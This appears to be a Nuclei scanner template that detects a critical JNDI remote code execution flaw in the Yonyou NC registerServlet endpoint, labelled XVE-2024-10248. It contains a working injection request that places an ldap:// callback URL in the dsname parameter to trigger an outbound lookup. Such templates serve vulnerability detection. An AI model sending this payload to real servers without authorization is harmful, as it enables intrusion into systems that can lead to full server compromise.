id: yongyouNC-registerServlet-jndi-rce
info:
  name:  用友NC registerServlet JNDI 远程代码执行漏洞(XVE-2024-10248)
  author: Superhero
  severity: critical
  description:  用友NC registerServlet 接口处存在JNDI远程代码执行漏洞，未经身份验证的远程攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。
  tags: RCE
  
http:
  - raw:
      - |
        POST /portal/registerServlet HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*; q=0.8,application/signed-exchange;v=b3;q=0.9 
        Accept-Encoding: gzip, deflate
        Accept-Language: zh,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,zh-CN;q=0.6
        Content-Type: application/x-www-form-urlencoded

        type=1&dsname=ldap://{{interactsh-url}}
    
    matchers:
      - type: word
        part: interactsh_protocol
        words:
        - "dns"





